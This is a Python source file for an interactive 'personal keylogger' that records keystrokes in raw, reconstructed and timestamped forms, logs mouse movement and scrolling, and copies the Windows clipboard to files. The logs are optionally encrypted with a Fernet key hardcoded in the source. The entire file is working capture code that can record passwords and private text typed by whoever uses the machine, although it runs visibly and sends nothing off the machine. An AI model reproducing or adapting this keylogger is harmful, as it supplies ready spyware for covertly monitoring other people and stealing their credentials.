from pynput.keyboard import Key, Listener
from pynput import mouse
from datetime import datetime
from pathlib import Path
import re
import win32clipboard
from cryptography.fernet import Fernet

path = str(Path.cwd()) + "/keylogs"

Path(path).mkdir(parents=True, exist_ok=True)

eKey = "Ln0QvS5tpSM2-yibcwDXbqmxcKd2GxoY5d5da-DIGG0="

print("Welcome to your personal keylogger\n")

print("Choose out of the following settings:")
print("type 'key' to start keylogger")
print("type 'mouse' to start monitoring mouse movement")
print("type 'clipboard' to copy the contents of the clipboard\n")

choice = False
optionA = False
optionB = False
optionC = False
optionMouse = False
encrypt = False

while not choice:
    options = input("Choose setting: ")
    if options == "key":
        choice = True
        print("Choose out of the following settings to start the keylogger. "
              "Multiple settings can be chosen. Separate each setting with a single space.")
        print("a - record keystrokes as they are")
        print("b - record keystrokes as they would appear to the user")
        print("c - record keystrokes with time")
        while not optionA and not optionB and not optionC:
            options = input("Choose setting: ")
            if re.search(' *a *', options):
                optionA = True
            if re.search(' *b *', options):
                optionB = True
            if re.search(' *c *', options):
                optionC = True
            if not optionA and not optionB and not optionC:
                print("Not a valid setting. Please try again.")
            else:
                check = False
                while not check:
                    res = input("Should the keylogs be encrypted? (y/n): ")
                    if re.match('Yes|yes|y|Y', res):
                        check = True
                        encrypt = True
                    elif re.match('No|no|n|N', res):
                        check = True
                        encrypt = False
                    if not check:
                        print("Please enter y or n")
    elif options == "mouse":
        choice = True
        optionMouse = True
        print("Mouse monitor is running. Right click mouse to terminate.")
    elif options == "clipboard":
        choice = True
        with open(path + "/clipboard.txt", "a") as cb:
            try:
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                cb.write(data)
                print("Clipboard copied")
            except:
                cb.write("Clipboard could not be copied")


if optionA or optionB or optionC:
    print("Keylogger is running. Press Esc to terminate keylogger.")

timestamp = datetime.now().strftime("%Y%m%dT%H%M%S")
timer = 0
bLog = ''

def on_move(x, y):
    with open(path + "/log_d_{}.txt".format(timestamp), "a") as fd:
        fd.write("{}\n".format('Pointer moved to {0}'.format((x, y))))
    print('Pointer moved to {0}'.format(
        (x, y)))


def on_click(x, y, button, pressed):
    print('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))
    if button == button.right:
        # Stop listener
        return False


def on_scroll(x, y, dx, dy):
    print('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))
    with open(path + "/log_d_{}.txt".format(timestamp), "a") as fd:
        fd.write('Scrolled {0} at {1}\n'.format(
        'down' if dy < 0 else 'up',
        (x, y)))


if optionMouse:
    with mouse.Listener(
            on_move=on_move,
            on_click=on_click,
            on_scroll=on_scroll) as listener:
        listener.join()


def on_press(key):
    global bLog
    print('{0} pressed'.format(key))
    time = datetime.now()
    k = str(key).replace("'", "")
    if k == "Key.esc":
        return
    if optionB:
        if k == "Key.space":
            bLog += ' '
        elif k == "Key.backspace":
            bLog = bLog[:-1]
        elif k == "Key.enter":
            bLog += '\n'
        elif k == "Key.shift":
            return
        else:
            bLog += k
    write_file(k, time)


def write_file(key, time):
    global bLog
    with open(path + "/log_a_{}.txt".format(timestamp), "a") as fa, \
            open(path + "/log_b_{}.txt".format(timestamp), "a") as fb, \
            open(path + "/log_c_{}.txt".format(timestamp), "a") as fc:
        if optionA:
            fa.write("{}\n".format(key))
        if optionB:
            # If the log is longer than 60 characters, write to file
            if len(bLog) > 60:
                fb.write("{}\n".format(bLog))
                bLog = ''
        if optionC:
            fc.write("{} {}\n".format(time, key))


def on_release(key):
    if key == Key.esc:
        if optionB:
            print(bLog)
            with open(path + "/log_b_{}.txt".format(timestamp), "a") as fb:
                fb.write("{}".format(bLog))
        # Encrypt files
        if optionA:
            with open(path + "/log_a_{}.txt".format(timestamp), "rb") as f:
                data = f.read()
            fernet = Fernet(eKey)
            encrypted = fernet.encrypt(data)
            with open(path + "/log_a_{}.txt".format(timestamp), "wb") as f:
                f.write(encrypted)
        if optionB:
            with open(path + "/log_b_{}.txt".format(timestamp), "rb") as f:
                data = f.read()
            fernet = Fernet(eKey)
            encrypted = fernet.encrypt(data)
            with open(path + "/log_b_{}.txt".format(timestamp), "wb") as f:
                f.write(encrypted)
        if optionC:
            with open(path + "/log_c_{}.txt".format(timestamp), "rb") as f:
                data = f.read()
            fernet = Fernet(eKey)
            encrypted = fernet.encrypt(data)
            with open(path + "/log_c_{}.txt".format(timestamp), "wb") as f:
                f.write(encrypted)
        # Remove any unused files
        if not optionA:
            try:
                Path(path + "/log_a_{}.txt".format(timestamp)).unlink()
            except FileNotFoundError:
                pass
        if not optionB:
            try:
                Path(path + "/log_b_{}.txt".format(timestamp)).unlink()
            except FileNotFoundError:
                pass
        if not optionC:
            try:
                Path(path + "/log_c_{}.txt".format(timestamp)).unlink()
            except FileNotFoundError:
                pass
        # Stop listener
        return False


# Collect events until released
if optionA or optionB or optionC:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
